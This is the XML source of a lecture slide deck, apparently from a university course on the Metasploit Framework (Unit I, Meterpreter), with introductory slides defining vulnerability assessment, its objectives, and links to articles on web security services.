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1"/>
  </p:notesMasterIdLst>
  <p:sldIdLst>
    <p:sldId id="256" r:id="rId2"/>
    <p:sldId id="258" r:id="rId3"/>
    <p:sldId id="264"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300" r:id="rId39"/>
    <p:sldId id="299" r:id="rId40"/>
    <p:sldId id="301" r:id="rId41"/>
    <p:sldId id="302" r:id="rId42"/>
    <p:sldId id="303" r:id="rId43"/>
    <p:sldId id="304" r:id="rId44"/>
    <p:sldId id="305" r:id="rId45"/>
    <p:sldId id="306" r:id="rId46"/>
    <p:sldId id="307" r:id="rId47"/>
    <p:sldId id="308" r:id="rId48"/>
    <p:sldId id="309"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 id="322" r:id="rId62"/>
    <p:sldId id="323" r:id="rId63"/>
    <p:sldId id="324" r:id="rId64"/>
    <p:sldId id="325" r:id="rId65"/>
    <p:sldId id="326" r:id="rId66"/>
    <p:sldId id="327" r:id="rId67"/>
    <p:sldId id="328" r:id="rId68"/>
    <p:sldId id="262" r:id="rId69"/>
    <p:sldId id="263" r:id="rId7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2" roundtripDataSignature="AMtx7miwGEa46m3SqSJsxoXyCwcLQkea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3BA4600-CF29-4966-8986-3B1AA4679568}">
  <a:tblStyle styleId="{D3BA4600-CF29-4966-8986-3B1AA467956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 name="Google Shape;3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264a707208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g3264a707208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0" name="Google Shape;9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
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Google Shape;9;p7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4" y="1955845"/>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0" name="Google Shape;10;p7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="603478" y="2256535"/>
            <a:ext cx="7887578" cy="133882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50"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="4050" b="1" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Introduction &amp;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4050" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4050" b="1" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Programming with </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="4050" b="1" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="4050" b="1" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>ESP8266</a:t>
            </a:r>
            <a:endParaRPr sz="4050" b="0" i="0" u="none" strike="noStrike" cap="none">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="11" name="Google Shape;11;p7"/>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12" name="Google Shape;12;p7"/>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9"/>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9"/>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9"/>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pic>
        <p:nvPicPr>
          <p:cNvPr id="23" name="Google Shape;23;p9"/>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24" name="Google Shape;24;p9"/>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dslide Layout">
  <p:cSld name="Endslide Layout">
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="1" name="Shape 25"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="26" name="Google Shape;26;p11"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId2">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="9144000" cy="6858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Layout">
  <p:cSld name="Content Layout">
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="1" name="Shape 27"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Google Shape;28;p10"/>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29" name="Google Shape;29;p10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="344873" y="3245670"/>
            <a:ext cx="2761065" cy="4030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54"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1154" b="1" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="864" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
            </a:br>
            <a:endParaRPr sz="864" b="0" i="0" u="none" strike="noStrike" cap="none">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="30" name="Google Shape;30;p10"/>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31" name="Google Shape;31;p10"/>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venturebeat.com/2011/05/04/chronology-of-the-attack-on-sonys-playstation-network/"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cloudflare.com/waf/" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cloudflare.com/rate-limiting/" TargetMode="External"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout2.xml"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cloudflare.com/ddos/"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p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4" y="1955845"/>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37" name="Google Shape;37;p1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="603475" y="2354309"/>
            <a:ext cx="7887600" cy="1138733"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="91425" tIns="45700" rIns="91425" bIns="45700" anchor="ctr" anchorCtr="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr lvl="0" algn="ctr">
              <a:buSzPts val="3500"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="3600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>303105324 - Metasploit Frame work</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="3600" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr sz="3500" b="1"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endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="0" algn="ctr">
              <a:buSzPts val="3000"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3000" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Unit I : </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="3200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Meterpreter-2</a:t>
            </a:r>
            <a:endParaRPr sz="3000" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="38" name="Google Shape;38;p1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="342741" y="5601409"/>
            <a:ext cx="3832829" cy="14926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dk1"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Prof. Gowtham A</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2200" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Assistant Professor </a:t>
            </a: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Department of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Computer Science &amp; Engineering</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr sz="1800" b="1"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endParaRPr sz="1500" b="1"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algn="ctr">
              <a:buSzPts val="2400"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg2"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Introduction to Metasploit</a:t>
            </a:r>
            <a:endParaRPr sz="24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
        <p:nvSpPr>
          <p:cNvPr id="2" name="Google Shape;116;p16">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C27ED14F-0273-3C83-7A75-FF0D0D51E12C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="907026" y="1639950"/>
            <a:ext cx="6858000" cy="482203"/>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Vulnerability Assessment</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="TextBox 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A109B046-4490-7817-0796-155B829C9F21}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="455971" y="2805405"/>
            <a:ext cx="8232058" cy="2862322"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="225425" marR="0" lvl="1" indent="0" algn="just" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1500"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>A vulnerability assessment is the process of identifying, classifying, defining and prioritizing vulnerabilities in computer systems, applications or network </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>infrastructures.T</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>he</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t> findings are reported to the organization, providing the necessary knowledge regarding the risk and potential impact of each vulnerability.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="225425" marR="0" lvl="1" indent="0" algn="just" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1500"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="15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25425" marR="0" lvl="1" indent="0" algn="just" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1500"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>A vulnerability can be defined in two ways:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="568325" marR="0" lvl="1" indent="-342900" algn="just" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1500"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="⮚"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>A bug in code or a flaw in software design that can be exploited to cause harm; Exploitation may occur via an authenticated or unauthenticated access.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="568325" marR="0" lvl="1" indent="-342900" algn="just" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1500"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="⮚"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>A gap in security procedures or a weakness in internal controls that when exploited, results in a security breach.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="548640" marR="0" lvl="2" indent="0" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1500"/>
              <a:buFont typeface="Arial" panose="020B0604020202020204"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>(One should include compliance related misconfigurations in VA.) </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="225425" marR="0" lvl="1" indent="0" algn="just" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1500"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="15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23;p17">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1BD392B6-23F1-6205-6D02-F2BCB684C82D}"/>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 </a:t>
            </a:r>
          </a:p>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Contd..</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" lvl="0" indent="0" algn="ctr" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr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5" name="Google Shape;124;p17">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{27642161-65F7-733E-D732-E9B239B43D1F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="628650" y="2249488"/>
            <a:ext cx="7886700" cy="4095750"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="91425" tIns="45700" rIns="91425" bIns="45700" anchor="t" anchorCtr="0">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="225425" marR="0" lvl="1" indent="0" algn="just" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1500"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr sz="15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25425" marR="0" lvl="1" indent="0" algn="just" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1500"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>  There are three </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>primary objectives</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t> of a vulnerability assessment.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="225425" marR="0" lvl="1" indent="0" algn="just" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1500"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr sz="15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800100" marR="0" lvl="1" indent="-342900" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1500"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="⮚"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>Identify vulnerabilities ranging from critical design flaws to simple misconfigurations.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="800100" marR="0" lvl="1" indent="-247650" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1500"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr sz="15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800100" marR="0" lvl="1" indent="-342900" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1500"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="⮚"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>Document the vulnerabilities so that developers can easily identify and reproduce the findings.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="800100" marR="0" lvl="1" indent="-247650" algn="just" rtl="0">
              <a:lnSpc>
